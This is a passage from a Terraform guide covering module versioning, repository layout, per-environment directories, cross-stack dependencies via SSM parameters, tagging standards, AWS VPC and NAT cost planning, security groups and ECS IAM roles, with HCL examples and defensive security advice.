  from = aws_ecs_service.main
  to   = aws_ecs_service.this
}
```

🧠 This is a genuinely excellent pattern. A module can refactor its own internals across a major version and consumers get a zero-change plan. Chapter 51 automates the release.

### 25.3 Private registries

| Option | How consumers reference it |
|---|---|
| **Git repository with tags** | `git::ssh://...//module?ref=v1.2.3`. Free, works immediately |
| **HCP Terraform private registry** | `app.terraform.io/acme/vpc/aws` with `version = "~> 1.2"` |
| **S3 bucket of zipped modules** | `s3::https://...` |
| **Artifactory / Nexus** | Vendor-specific |

**Recommendation for a small team:** a single `terraform-modules` repository with git tags. Use `?ref=vX.Y.Z`. Move to a registry only when version discovery becomes a real friction point.

### 25.4 Evaluating a public module

Public modules like `terraform-aws-modules/vpc/aws` (currently 6.7.3) are excellent and save real time. They are also code you are running with full cloud credentials.

- [ ] Who maintains it? `terraform-aws-modules`, `terraform-google-modules`, `hashicorp` are well-maintained community/vendor efforts.
- [ ] Recent commits and releases? A module untouched for two years will not support the current provider.
- [ ] Read the source of anything that creates IAM.
- [ ] Check the open issue count and whether maintainers respond.
- [ ] **Pin the version.** Dependabot can bump it in a PR you review.
- [ ] Consider vendoring (copying into your repo) for security-critical modules. You lose upstream fixes but gain complete control.

---

## Chapter 26 — Repository Layout: Monorepo vs Multi-Repo

### 26.1 The options

```mermaid
flowchart TD
    subgraph MONO["Monorepo — one infrastructure repo"]
        M1["infrastructure/<br/>├── modules/<br/>├── stacks/<br/>└── .github/workflows/"]
        M2["+ Atomic cross-stack changes<br/>+ One CI configuration<br/>+ Easy to see everything<br/>− Path filtering complexity<br/>− Coarse access control"]
    end
    subgraph MULTI["Multi-repo — repo per concern"]
        R1["terraform-modules/<br/>infra-foundation/<br/>infra-data/<br/>api-infra/  worker-infra/"]
        R2["+ Fine-grained access control<br/>+ Independent release cadence<br/>+ Small, fast CI<br/>− Cross-repo changes need coordination<br/>− CI config duplicated everywhere"]
    end
    subgraph HYBRID["Hybrid — RECOMMENDED for most teams"]
        H1["terraform-modules/  (versioned, tagged)<br/>infrastructure/     (all stacks, monorepo)"]
        H2["+ Modules versioned independently<br/>+ Stacks change together atomically<br/>+ One pipeline to maintain"]
    end
```

**Recommendation for 3–8 engineers:** the hybrid. Two repositories — one for versioned modules, one for all stacks. Application code stays in its own repositories and does not contain Terraform.

### 26.2 A concrete hybrid layout

```
terraform-modules/                    # repo 1 — tagged releases
├── modules/
│   ├── vpc/
│   ├── ecs-service/
│   ├── rds-postgres/
│   ├── eks-cluster/
│   └── observability/
├── .github/workflows/
│   ├── validate.yml                  # fmt, validate, tflint, tftest per module
│   └── release.yml                   # tag + move major tag (Chapter 51)
└── README.md

infrastructure/                       # repo 2 — all stacks
├── stacks/
│   ├── bootstrap/
│   ├── foundation/{dev,staging,production}/
│   ├── data/{dev,staging,production}/
│   └── apps/
│       ├── api/{dev,staging,production}/
│       └── worker/{dev,staging,production}/
├── policies/                         # OPA/Conftest rego
├── .github/workflows/
│   ├── terraform-plan.yml
│   ├── terraform-apply.yml
│   └── drift-detect.yml
├── .tflint.hcl
├── .pre-commit-config.yaml
└── CODEOWNERS
```

```
# CODEOWNERS
/stacks/bootstrap/              @acme/platform-leads
/stacks/foundation/             @acme/platform
/stacks/data/                   @acme/platform @acme/dba
/stacks/apps/api/               @acme/api-team @acme/platform
/stacks/apps/api/production/    @acme/api-team @acme/platform-leads
/policies/                      @acme/security
/.github/workflows/             @acme/platform
```

🧠 The per-environment CODEOWNERS entry is the cheap way to require heavier review on production without a separate repository.

### 26.3 Should Terraform live with application code?

**Recommendation: no**, for backend services, with one exception.

| | Terraform in the app repo | Terraform in an infra repo |
|---|---|---|
| Developer proximity | ✅ Change code and infra in one PR | ❌ Two PRs |
| Blast radius of a bad merge | ⚠️ App CI credentials now reach infrastructure | ✅ Separated |
| Access control | ⚠️ Everyone with app write access can change infra | ✅ CODEOWNERS on infra |
| Consistency across services | ❌ Each service drifts | ✅ One place to enforce |
| Cross-service changes | ❌ Hard | ✅ Atomic |

The exception: **genuinely service-local infrastructure that nobody else touches** — an SQS queue only this service reads, its own alarms. Even then, a well-designed `ecs-service` module in the infra repo usually covers it.

---

## Chapter 27 — Environment Strategies

The most-debated question in Terraform. Here is the honest comparison.

### 27.1 The four options

```mermaid
flowchart TD
    subgraph A["Option A — Directory per environment"]
        A1["stacks/api/dev/<br/>stacks/api/staging/<br/>stacks/api/production/"]
        A2["Separate state, separate backend block,<br/>separate tfvars, explicit"]
    end
    subgraph B["Option B — Workspaces"]
        B1["one directory<br/>terraform workspace select production"]
        B2["Separate state per workspace,<br/>SAME configuration, branching on<br/>terraform.workspace"]
    end
    subgraph C["Option C — Terragrunt"]
        C1["live/dev/api/terragrunt.hcl<br/>live/prod/api/terragrunt.hcl"]
        C2["Generated backend config,<br/>DRY inputs, dependency graph"]
    end
    subgraph D["Option D — Stacks (HCP only)"]
        D1["components.tfstack.hcl<br/>deployments.tfdeploy.hcl"]
        D2["Native multi-deployment orchestration"]
    end
```

### 27.2 The comparison table

| | Directories | Workspaces | Terragrunt | Stacks |
|---|---|---|---|---|
| State isolation | ✅ Separate backends | ✅ Separate keys, same backend | ✅ Separate | ✅ Separate |
| Config can differ per env | ✅ Fully | ⚠️ Only via conditionals | ✅ Fully | ✅ |
| Duplication | ⚠️ High (backend blocks, tfvars) | ✅ None | ✅ Low | ✅ Low |
| Explicitness | ✅ Very — you can read it | ❌ Poor — "which workspace am I in?" | ⚠️ Indirect | ⚠️ Indirect |
| Risk of wrong-env apply | ✅ Low — directory is the context | ⚠️ **High** — a forgotten `workspace select` | ✅ Low | ✅ Low |
| Per-env IAM / CI scoping | ✅ Natural (path-based) | ❌ Hard | ✅ | ✅ |
| Extra tooling | None | None | Terragrunt | HCP subscription |
| Provider version can differ per env | ✅ | ❌ | ✅ | ⚠️ |
| Staged upgrades (dev first) | ✅ Easy | ❌ Hard | ✅ | ✅ |
| Availability | Everywhere | Everywhere | Everywhere | ⚠️ **HCP/TFE only** |

### 27.3 Why workspaces are usually the wrong choice for environments

```hcl
# ⚠️ INTENTIONALLY BAD EXAMPLE — the workspace-as-environment pattern
locals {
  instance_class = terraform.workspace == "production" ? "db.r6g.xlarge" : "db.t4g.micro"
  multi_az       = terraform.workspace == "production"
  replica_count  = terraform.workspace == "production" ? 3 : 1
}
```

Problems, all real:

1. **A forgotten `terraform workspace select` applies dev config to production.** There is no visual indication in the file you are editing.
2. Conditionals multiply. A mature workspace-based config is an unreadable mesh of `terraform.workspace ==` checks.
3. **You cannot stage changes.** Upgrading the AWS provider in dev before production is impossible — it is the same configuration.
4. CI cannot scope credentials by path, because there is only one path.
5. Environments genuinely diverge over time (production has a read replica, dev does not) and the conditionals become unmaintainable.

**Where workspaces *are* right:** short-lived, structurally identical copies — a per-PR ephemeral environment, a per-developer sandbox, a per-tenant deployment of an identical stack.

### 27.4 The recommended pattern: directories

```
stacks/apps/api/
├── dev/
│   ├── terraform.tf        # backend: apps/api/dev/terraform.tfstate
│   ├── main.tf             # module "service" { ... }
│   └── terraform.tfvars
├── staging/
│   ├── terraform.tf
│   ├── main.tf
│   └── terraform.tfvars
└── production/
    ├── terraform.tf
    ├── main.tf
    └── terraform.tfvars
```

The duplication objection is real but smaller than it looks, because **`main.tf` in each environment is a thin module call**:

```hcl
# stacks/apps/api/production/main.tf
module "service" {
  source = "git::ssh://git@github.com/acme/terraform-modules.git//ecs-service?ref=v3.2.0"

  name        = "api"
  environment = "production"

  cluster_arn = data.terraform_remote_state.foundation.outputs.ecs_cluster_arn
  vpc_id      = data.terraform_remote_state.foundation.outputs.vpc_id
  subnet_ids  = data.terraform_remote_state.foundation.outputs.private_subnet_ids

  image         = var.image
  cpu           = 2048
  memory        = 4096
  desired_count = 6

  autoscaling = {
    min_capacity = 6
    max_capacity = 30
  }

  secrets = {
    DB_PASSWORD = data.terraform_remote_state.data.outputs.db_password_secret_arn
  }
}
```

The dev version differs only in the numbers. That is roughly 30 lines duplicated three times — entirely acceptable, and **the duplication is the feature**: production's configuration is visible in one file, not assembled from conditionals.

### 27.5 Reducing the duplication without Terragrunt

Symlink the shared parts:

```
stacks/apps/api/
├── _shared/
│   ├── main.tf
│   ├── variables.tf
│   └── outputs.tf
├── production/
│   ├── main.tf -> ../_shared/main.tf          # symlink
│   ├── variables.tf -> ../_shared/variables.tf
│   ├── terraform.tf                            # unique: backend
│   └── terraform.tfvars                        # unique: values
```

⚠️ Symlinks work but confuse editors, some CI checkouts, and Windows users. **Recommendation:** accept the duplication instead. It is 30 lines.

### 27.6 Environment-specific behaviour, done properly

Do not branch on the environment name inside modules. Pass explicit values:

```hcl
# ⚠️ BAD — the module knows about environments
variable "environment" { type = string }
locals {
  instance_class = var.environment == "production" ? "db.r6g.xlarge" : "db.t4g.micro"
}

# ✅ GOOD — the module takes a value; the caller decides
variable "instance_class" {
  type    = string
  default = "db.t4g.micro"
}
```

The module still *validates* environment-appropriate choices (Chapter 11's cross-variable validation), but the decision lives with the caller.

---

## Chapter 28 — Cross-Stack Dependencies

Once you split state, stacks need values from each other. There are four mechanisms and they are not equivalent.

### 28.1 The four options

```mermaid
flowchart TD
    A["Stack B needs the VPC ID<br/>created by Stack A"]
    A --> O1["1. terraform_remote_state<br/>read A's state file directly"]
    A --> O2["2. Data source<br/>look it up by tag or name in the cloud API"]
    A --> O3["3. Parameter store<br/>A writes to SSM; B reads from SSM"]
    A --> O4["4. Explicit input variable<br/>the value is passed in by the pipeline"]

    O1 --> C1["+ Simple, no extra resources<br/>− B needs READ ACCESS TO A'S STATE<br/>  which contains A's secrets<br/>− Tight coupling to A's output names"]
    O2 --> C2["+ No state coupling at all<br/>+ Works across tools and clouds<br/>− Depends on tagging discipline<br/>− Fails confusingly if tags change"]
    O3 --> C3["+ Explicit published contract<br/>+ No state access needed<br/>+ Versionable, auditable<br/>− Extra resources to manage"]
    O4 --> C4["+ Most explicit, fully testable<br/>− The pipeline must supply it<br/>− Manual wiring"]
```

### 28.2 `terraform_remote_state`

```hcl
data "terraform_remote_state" "foundation" {
  backend = "s3"
  config = {
    bucket = "acme-tfstate-123456789012"
    key    = "foundation/production/terraform.tfstate"
    region = "ap-south-1"
  }
}

module "service" {
  vpc_id     = data.terraform_remote_state.foundation.outputs.vpc_id
  subnet_ids = data.terraform_remote_state.foundation.outputs.private_subnet_ids
}
```

⚠️⚠️ **The security problem, stated plainly.** To read `foundation`'s outputs, the `api` stack's IAM role needs `s3:GetObject` on `foundation`'s **entire state file** — which contains every attribute of every resource in that stack, including any secrets. You have just given the application pipeline read access to the foundation's secrets.

This is the single most underappreciated risk in multi-stack Terraform.

**Mitigations:**
- Ensure the *upstream* stack contains no secrets (put secrets in Secrets Manager, reference by ARN).
- Prefer SSM (option 3) for anything crossing a trust boundary.
- If you must use remote state, only read from stacks at the *same or lower* sensitivity.

⚠️ **Coupling:** renaming an output in `foundation` breaks every downstream stack, with no compile-time warning. Treat upstream outputs as a public API and version them.

### 28.3 Data sources

```hcl
data "aws_vpc" "main" {
  filter {
    name   = "tag:Name"
    values = ["acme-production"]
  }
}

data "aws_subnets" "private" {
  filter {
    name   = "vpc-id"
    values = [data.aws_vpc.main.id]
  }
  filter {
    name   = "tag:Tier"
    values = ["private"]
  }
}
```

No state access required. The coupling is to **tags**, which must therefore be treated as a contract — enforce them (Chapter 29) and never change them casually.

⚠️ If the filter matches zero resources, you get a confusing error at plan time. If it matches more than one, `aws_vpc` errors while `aws_subnets` silently returns all of them, which may not be what you want.

### 28.4 SSM Parameter Store — the recommended pattern

The upstream stack **publishes a contract**:

```hcl
# In foundation/production
resource "aws_ssm_parameter" "vpc_id" {
  name  = "/acme/production/network/vpc_id"
  type  = "String"
  value = module.vpc.vpc_id
  tier  = "Standard"
}

resource "aws_ssm_parameter" "private_subnet_ids" {
  name  = "/acme/production/network/private_subnet_ids"
  type  = "StringList"
  value = join(",", module.vpc.private_subnet_ids)
}

resource "aws_ssm_parameter" "ecs_cluster_arn" {
  name  = "/acme/production/compute/ecs_cluster_arn"
  type  = "String"
  value = aws_ecs_cluster.main.arn
}
```

The downstream stack **consumes it**:

```hcl
data "aws_ssm_parameter" "vpc_id" {
  name = "/acme/production/network/vpc_id"
}

data "aws_ssm_parameter" "private_subnet_ids" {
  name = "/acme/production/network/private_subnet_ids"
}

module "service" {
  vpc_id     = data.aws_ssm_parameter.vpc_id.value
  subnet_ids = split(",", data.aws_ssm_parameter.private_subnet_ids.value)
}
```

**Why this is better:**

- The downstream IAM role needs `ssm:GetParameter` on a *specific parameter path* — not read access to a whole state file.
- The parameter names form an explicit, documented contract. Renaming one is a visible breaking change.
- It works across clouds, across tools, and from application code at runtime.
- 💰 Standard-tier parameters are free.

In GCP the equivalent is Secret Manager or a well-known GCS object; on Azure, App Configuration.

### 28.5 The comparison

| | Remote state | Data source | SSM parameter | Input variable |
|---|---|---|---|---|
| Security | ⚠️ Reads whole upstream state | ✅ No state access | ✅ Scoped per parameter | ✅ None |
| Coupling | Output names | Tag values | Parameter paths | Pipeline config |
| Extra resources | None | None | One per value | None |
| Cross-cloud | ❌ | Per-cloud | ✅ | ✅ |
| Testability | ⚠️ Needs real state | ⚠️ Needs real resources | ⚠️ Needs a parameter | ✅ Easy to mock |
| Fails when upstream missing | Confusing error | Confusing error | Clear error | Clear error |

**Recommendation:** SSM (or Secret Manager on GCP) for anything crossing a team or sensitivity boundary. `terraform_remote_state` is acceptable *within* one team's stacks of equal sensitivity, where the convenience genuinely wins. Data sources where tags are already a reliable contract.

### 28.6 Avoiding the ordering problem

Terraform will not tell you that `foundation` must be applied before `apps/api`. Encode it:

```yaml
# .github/workflows/terraform-apply.yml — ordered matrix
jobs:
  apply:
    strategy:
      max-parallel: 1              # ← forces sequential
      matrix:
        stack: [foundation, data, apps/api, apps/worker]
```

`max-parallel: 1` combined with `fail-fast: true` means a foundation failure stops everything downstream — which is what you want.

---

## Chapter 29 — Naming, Tagging and Labelling Standards

### 29.1 Naming

```hcl
locals {
  # <project>-<environment>-<component>
  name_prefix = "${var.project}-${var.environment}"
}

resource "aws_ecs_cluster" "main" {
  name = local.name_prefix                      # acme-production
}

resource "aws_lb" "main" {
  name = "${local.name_prefix}-alb"             # acme-production-alb
}

resource "aws_db_instance" "main" {
  identifier = "${local.name_prefix}-postgres"  # acme-production-postgres
}
```

⚠️ **AWS name length limits that will bite you:**

| Resource | Limit |
|---|---|
| ALB / NLB name | 32 characters |
| Target group name | 32 characters |
| IAM role name | 64 characters |
| RDS identifier | 63 characters |
| S3 bucket | 63 characters, **globally unique** |
| Lambda function | 64 characters |

Use `name_prefix` where the provider supports it — it lets AWS generate a unique suffix and is required for `create_before_destroy`.

### 29.2 Tagging

```hcl
provider "aws" {
  region = var.aws_region

  default_tags {
    tags = {
      Project     = var.project
      Environment = var.environment
      ManagedBy   = "terraform"
      Repository  = var.repository
      Stack       = var.stack_name
      Owner       = var.owning_team
      CostCenter  = var.cost_center
    }
  }
}
```

**A tagging standard worth adopting:**

| Tag | Purpose | Example |
|---|---|---|
| `Project` | Which product | `acme-platform` |
| `Environment` | Which environment | `production` |
| `ManagedBy` | Distinguish IaC from manual | `terraform` |
| `Repository` | Where the code lives | `acme/infrastructure` |
| `Stack` | Which state file owns it | `apps/api/production` |
| `Owner` | Which team to page | `api-team` |
| `CostCenter` | 💰 Cost allocation | `eng-platform` |
| `DataClassification` | Compliance | `confidential` |

🧠 **`ManagedBy = terraform` is the tag that makes drift auditing possible.** Query for resources *without* it to find everything created by hand.

⚠️ **`default_tags` caveats:**
- It does not apply to resources that do not support tags.
- Some resources (autoscaling groups, ECS services propagating to tasks) have their own tag-propagation semantics that interact oddly.
- A tag set both in `default_tags` and on the resource produces a persistent diff in some provider versions. Set each tag in exactly one place.
- `ignore_tags` on the provider is useful when another system (like Kubernetes' AWS controllers) adds tags you do not want to fight over:

```hcl
provider "aws" {
  ignore_tags {
    key_prefixes = ["kubernetes.io/", "elbv2.k8s.aws/"]
  }
}
```

### 29.3 GCP labels

GCP uses **labels**, which are stricter than AWS tags: lowercase letters, numbers, hyphens and underscores only; no uppercase, no spaces.

```hcl
locals {
  labels = {
    project     = "acme-platform"
    environment = "production"
    managed_by  = "terraform"
    owner       = "api-team"
  }
}

resource "google_cloud_run_v2_service" "api" {
  name     = "acme-production-api"
  location = var.region
  labels   = local.labels
}
```

⚠️ The `google` provider has `default_labels` at the provider level (v5+), but coverage is less complete than AWS `default_tags`. Verify per resource.

### 29.4 Enforcing the standard

```hcl
# Validate in the module
variable "tags" {
  type = map(string)

  validation {
    condition = alltrue([
      for k in ["Owner", "CostCenter"] : contains(keys(var.tags), k)
    ])
    error_message = "tags must include Owner and CostCenter."
  }
}
```

And in policy (Chapter 43):

```rego
package terraform.tags

required := {"Project", "Environment", "ManagedBy", "Owner", "CostCenter"}

deny contains msg if {
  r := input.resource_changes[_]
  r.change.actions[_] == "create"
  startswith(r.type, "aws_")
  missing := required - object.keys(r.change.after.tags_all)
  count(missing) > 0
  msg := sprintf("%s is missing required tags: %v", [r.address, missing])
}
```

---
# Part VI — Production Infrastructure Patterns

All examples in this part target AWS with ECS on Fargate as the primary compute. Chapters 37–38 cover Kubernetes (EKS and GKE). Chapter 39 gives the GCP equivalents for everything else.

---

## Chapter 30 — AWS Networking: VPC, Subnets, NAT, Endpoints

### 30.1 The mental model

```mermaid
flowchart TD
    IGW["Internet Gateway"] --> PUB["Public subnets<br/>10.20.0.0/24, 10.20.1.0/24, 10.20.2.0/24<br/>one per AZ"]
    PUB --> ALB["Application Load Balancer"]
    PUB --> NAT["NAT Gateway<br/>💰 ~$32/month each + data processing"]
    NAT --> PRIV["Private subnets<br/>10.20.16.0/20, 10.20.32.0/20, 10.20.48.0/20"]
    PRIV --> ECS["ECS Fargate tasks"]
    PRIV --> DB["Database subnets<br/>10.20.128.0/24, 10.20.129.0/24, 10.20.130.0/24<br/>NO route to NAT"]
    ALB --> ECS
    ECS --> DB
    ECS -.->|"via VPC endpoints,<br/>NOT through NAT"| VPCE["VPC Endpoints<br/>S3, ECR, Secrets Manager,<br/>CloudWatch Logs"]
```

Three tiers, each with a different routing posture:

| Tier | Route to internet | Contains |
|---|---|---|
| **Public** | Direct, via IGW | ALB, NAT gateways, bastion (if any) |
| **Private** | Outbound only, via NAT | Application tasks, Lambda in VPC |
| **Database** | **None** | RDS, ElastiCache. Reached only from private |

### 30.2 CIDR planning — decide this once, carefully

⚠️ **Subnet `cidr_block` is `ForceNew`.** Changing it destroys the subnet, which requires destroying every network interface in it, which means your database, your tasks and your load balancer. You effectively cannot change this after launch.

```hcl
locals {
  vpc_cidr = "10.20.0.0/16"     # 65,536 addresses

  # cidrsubnet(prefix, newbits, netnum)
  public_subnets   = [for i in range(3) : cidrsubnet(local.vpc_cidr, 8, i)]        # /24, 251 usable each
  private_subnets  = [for i in range(3) : cidrsubnet(local.vpc_cidr, 4, i + 1)]    # /20, 4091 usable each
  database_subnets = [for i in range(3) : cidrsubnet(local.vpc_cidr, 8, i + 128)]  # /24
}
```

**Planning rules:**

1. **Give private subnets far more space than you think.** Every Fargate task consumes an IP. Every EKS pod with the VPC CNI consumes an IP. Running out of IPs in production is a painful, unfixable-in-place incident. `/20` per AZ is a reasonable minimum.
2. **Allocate non-overlapping CIDRs per environment and per account** so you can peer or use Transit Gateway later. `10.10.0.0/16` dev, `10.20.0.0/16` staging, `10.30.0.0/16` production.
3. **Reserve space.** Leave gaps between tiers for subnets you have not thought of yet.
4. AWS reserves 5 addresses in every subnet. A `/28` gives you 11 usable, not 16.

### 30.3 The VPC

**Recommendation:** use `terraform-aws-modules/vpc/aws` (6.7.3) rather than writing 300 lines by hand. It is well maintained, handles the many edge cases, and is what most teams use.

```hcl
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "~> 6.7"

  name = local.name_prefix
  cidr = local.vpc_cidr

  azs              = slice(data.aws_availability_zones.available.names, 0, 3)
  public_subnets   = local.public_subnets
  private_subnets  = local.private_subnets
  database_subnets = local.database_subnets

  create_database_subnet_group       = true
  create_database_subnet_route_table = true

  # 💰 THE cost decision in this module. See below.
  enable_nat_gateway     = true
  single_nat_gateway     = var.environment != "production"
  one_nat_gateway_per_az = var.environment == "production"

  enable_dns_hostnames = true
  enable_dns_support   = true

  # VPC flow logs — required by most compliance frameworks, genuinely useful for debugging
  enable_flow_log                                 = true
  create_flow_log_cloudwatch_log_group            = true
  create_flow_log_cloudwatch_iam_role             = true
  flow_log_max_aggregation_interval               = 60
  flow_log_cloudwatch_log_group_retention_in_days = 30

  public_subnet_tags = {
    Tier                     = "public"
    "kubernetes.io/role/elb" = "1"          # only if you run EKS here
  }
  private_subnet_tags = {
    Tier                              = "private"
    "kubernetes.io/role/internal-elb" = "1"
  }
  database_subnet_tags = {
    Tier = "database"
  }

  tags = local.common_tags
}

data "aws_availability_zones" "available" {
  state = "available"
  filter {
    name   = "opt-in-status"
    values = ["opt-in-not-required"]
  }
}
```

### 30.4 💰 The NAT gateway cost trap

This is, in my experience, the most common source of surprise AWS bills in Terraform-managed infrastructure.

| Configuration | Monthly hourly cost | Availability | Cross-AZ data charges |
|---|---|---|---|
| `single_nat_gateway = true` | ~$32 | ⚠️ Single AZ failure kills all outbound | 💰 Yes — traffic from other AZs crosses AZ boundaries |
| `one_nat_gateway_per_az = true` (3 AZs) | ~$97 | ✅ Resilient | ✅ No cross-AZ charges |

Plus **data processing at roughly $0.045 per GB in both directions**, which frequently exceeds the hourly cost. A service pulling 500 GB of container images and writing 200 GB of logs through NAT pays more for data processing than for the gateways.

**Recommendation:**
- Non-production: `single_nat_gateway = true`. Accept the AZ risk.
- Production: one per AZ.
- **In every environment: add VPC endpoints.** They usually pay for themselves within weeks.

### 30.5 VPC endpoints

```hcl
# Gateway endpoints — FREE, no hourly charge, no data charge
resource "aws_vpc_endpoint" "s3" {
  vpc_id            = module.vpc.vpc_id
  service_name      = "com.amazonaws.${var.aws_region}.s3"
  vpc_endpoint_type = "Gateway"
  route_table_ids   = concat(
    module.vpc.private_route_table_ids,
    module.vpc.database_route_table_ids,
  )
  tags = merge(local.common_tags, { Name = "${local.name_prefix}-s3-endpoint" })
}

resource "aws_vpc_endpoint" "dynamodb" {
  vpc_id            = module.vpc.vpc_id
  service_name      = "com.amazonaws.${var.aws_region}.dynamodb"
  vpc_endpoint_type = "Gateway"
  route_table_ids   = module.vpc.private_route_table_ids
}

# Interface endpoints — 💰 ~$7.20/month per endpoint per AZ, plus $0.01/GB
locals {
  interface_endpoints = [
    "ecr.api",              # ECS pulling images
    "ecr.dkr",
    "logs",                 # CloudWatch Logs
    "secretsmanager",       # ECS injecting secrets
    "ssm",                  # Parameter Store
    "ecs",
    "ecs-agent",
    "ecs-telemetry",
    "sts",                  # IAM role assumption
    "kms",
  ]
}

resource "aws_vpc_endpoint" "interface" {
  for_each = toset(local.interface_endpoints)

  vpc_id              = module.vpc.vpc_id
  service_name        = "com.amazonaws.${var.aws_region}.${each.key}"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = module.vpc.private_subnets
  security_group_ids  = [aws_security_group.vpc_endpoints.id]
  private_dns_enabled = true

  tags = merge(local.common_tags, { Name = "${local.name_prefix}-${each.key}-endpoint" })
}

resource "aws_security_group" "vpc_endpoints" {
  name_prefix = "${local.name_prefix}-vpce-"
  description = "Allow HTTPS from within the VPC to interface endpoints"
  vpc_id      = module.vpc.vpc_id

  lifecycle { create_before_destroy = true }
}

resource "aws_vpc_security_group_ingress_rule" "vpc_endpoints_https" {
  security_group_id = aws_security_group.vpc_endpoints.id
  cidr_ipv4         = module.vpc.vpc_cidr_block
  from_port         = 443
  to_port           = 443
  ip_protocol       = "tcp"
  description       = "HTTPS from the VPC"
}
```

💰 **The arithmetic:** ten interface endpoints across three AZs costs roughly $216/month in hourly charges. That is worth it only if you are pushing more than about 5 TB/month through NAT. **Start with the free gateway endpoints (S3, DynamoDB) — they are almost always a win — and add interface endpoints when your NAT data-processing bill justifies them.** Look at Cost Explorer before deciding.

Security benefit, separate from cost: endpoints let you write `aws:SourceVpce` conditions in IAM and S3 bucket policies, so data can only be reached from inside your VPC.

### 30.6 Security groups: use standalone rules

```hcl
resource "aws_security_group" "alb" {
  name_prefix = "${local.name_prefix}-alb-"
  description = "Public ALB"
  vpc_id      = module.vpc.vpc_id
  tags        = merge(local.common_tags, { Name = "${local.name_prefix}-alb" })

  lifecycle { create_before_destroy = true }
}

resource "aws_security_group" "service" {
  name_prefix = "${local.name_prefix}-service-"
  description = "ECS service tasks"
  vpc_id      = module.vpc.vpc_id
  tags        = merge(local.common_tags, { Name = "${local.name_prefix}-service" })

  lifecycle { create_before_destroy = true }
}

resource "aws_security_group" "database" {
  name_prefix = "${local.name_prefix}-db-"
  description = "RDS PostgreSQL"
  vpc_id      = module.vpc.vpc_id
  tags        = merge(local.common_tags, { Name = "${local.name_prefix}-db" })

  lifecycle { create_before_destroy = true }
}

# --- Rules as separate resources ---

resource "aws_vpc_security_group_ingress_rule" "alb_https" {
  security_group_id = aws_security_group.alb.id
  cidr_ipv4         = "0.0.0.0/0"
  from_port         = 443
  to_port           = 443
  ip_protocol       = "tcp"
  description       = "HTTPS from the internet"
}

resource "aws_vpc_security_group_egress_rule" "alb_to_service" {
  security_group_id            = aws_security_group.alb.id
  referenced_security_group_id = aws_security_group.service.id
  from_port                    = var.container_port
  to_port                      = var.container_port
  ip_protocol                  = "tcp"
  description                  = "ALB to service tasks"
}

resource "aws_vpc_security_group_ingress_rule" "service_from_alb" {
  security_group_id            = aws_security_group.service.id
  referenced_security_group_id = aws_security_group.alb.id
  from_port                    = var.container_port
  to_port                      = var.container_port
  ip_protocol                  = "tcp"
  description                  = "Service accepts traffic from the ALB"
}

resource "aws_vpc_security_group_ingress_rule" "db_from_service" {
  security_group_id            = aws_security_group.database.id
  referenced_security_group_id = aws_security_group.service.id
  from_port                    = 5432
  to_port                      = 5432
  ip_protocol                  = "tcp"
  description                  = "PostgreSQL from the service"
}

resource "aws_vpc_security_group_egress_rule" "service_all" {
  security_group_id = aws_security_group.service.id
  cidr_ipv4         = "0.0.0.0/0"
  ip_protocol       = "-1"
  description       = "All outbound — restrict further if your threat model requires it"
}
```

🧠 **Why standalone rules rather than inline `ingress {}` blocks:**

1. **No cycle errors.** The ALB references the service SG and the service references the ALB SG. With inline blocks this is a graph cycle; with standalone rules the SGs are created first and rules added after.
2. **Independent diffs.** Changing one rule does not show a diff on the whole security group.
3. **Inline blocks silently delete out-of-band rules.** An inline `ingress` block is authoritative — if someone adds a rule in the console during an incident, the next apply removes it with no warning in the plan beyond a one-line change. Standalone rules make each addition and removal explicit.
4. **`description` is required** on the new-style resources, which is good discipline.

⚠️ `aws_security_group_rule` (the older resource) is deprecated in favour of `aws_vpc_security_group_ingress_rule` and `aws_vpc_security_group_egress_rule`. The new ones have a real `id`, support tags, and behave better with `for_each`.

⚠️ **Never mix inline blocks and standalone rules on the same security group.** They fight, and you get a permanent diff.

---

## Chapter 31 — IAM and Least Privilege

### 31.1 Always use `aws_iam_policy_document`

```hcl
data "aws_iam_policy_document" "task" {
  statement {
    sid    = "ReadAppSecrets"
    effect = "Allow"
    actions = [
      "secretsmanager:GetSecretValue",
    ]
    resources = [
      "arn:aws:secretsmanager:${var.aws_region}:${data.aws_caller_identity.current.account_id}:secret:${var.environment}/${var.name}/*",
    ]
  }

  statement {
    sid    = "WriteUploads"
    effect = "Allow"
    actions = [
      "s3:PutObject",
      "s3:GetObject",
      "s3:DeleteObject",
    ]
    resources = ["${aws_s3_bucket.uploads.arn}/*"]

    condition {
      test     = "StringEquals"
      variable = "s3:x-amz-server-side-encryption"
      values   = ["aws:kms"]
    }
  }

  statement {
    sid    = "ConsumeQueue"
    effect = "Allow"
    actions = [
      "sqs:ReceiveMessage",
      "sqs:DeleteMessage",
      "sqs:GetQueueAttributes",
      "sqs:ChangeMessageVisibility",
    ]
    resources = [aws_sqs_queue.jobs.arn]
  }
}
```

Advantages over `jsonencode` or a heredoc: the provider validates structure, the plan diff is readable, and you get `source_policy_documents` / `override_policy_documents` for composition.

### 31.2 ECS needs two different roles

This trips up almost everyone the first time.

```mermaid
flowchart TD
    subgraph EXEC["Task EXECUTION role — used by the ECS AGENT"]
        E1["Pull the image from ECR"]
        E2["Write container logs to CloudWatch"]
        E3["Resolve 'secrets' from Secrets Manager / SSM<br/>and inject them as env vars"]
        E4["Used BEFORE your container starts"]
    end
    subgraph TASK["Task role — used by YOUR APPLICATION CODE"]
        T1["Read and write S3"]
        T2["Consume SQS"]
        T3["Call other AWS APIs"]
        T4["Used at RUNTIME by your code, via the<br/>container credentials endpoint"]
    end
```

```hcl
# --- Execution role ---
data "aws_iam_policy_document" "ecs_assume" {
  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRole"]
    principals {
      type        = "Service"
      identifiers = ["ecs-tasks.amazonaws.com"]
    }
    # Confused-deputy protection
    condition {
      test     = "ArnLike"
      variable = "aws:SourceArn"
      values   = ["arn:aws:ecs:${var.aws_region}:${data.aws_caller_identity.current.account_id}:*"]
    }
    condition {
      test     = "StringEquals"
      variable = "aws:SourceAccount"
      values   = [data.aws_caller_identity.current.account_id]
    }
  }
}

resource "aws_iam_role" "execution" {
  name               = "${local.name_prefix}-${var.name}-execution"
  assume_role_policy = data.aws_iam_policy_document.ecs_assume.json
  tags               = local.common_tags
}

resource "aws_iam_role_policy_attachment" "execution_managed" {
  role       = aws_iam_role.execution.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy"
}

# The managed policy does NOT cover reading your specific secrets — add that
data "aws_iam_policy_document" "execution_secrets" {
  statement {
    effect  = "Allow"
    actions = ["secretsmanager:GetSecretValue"]
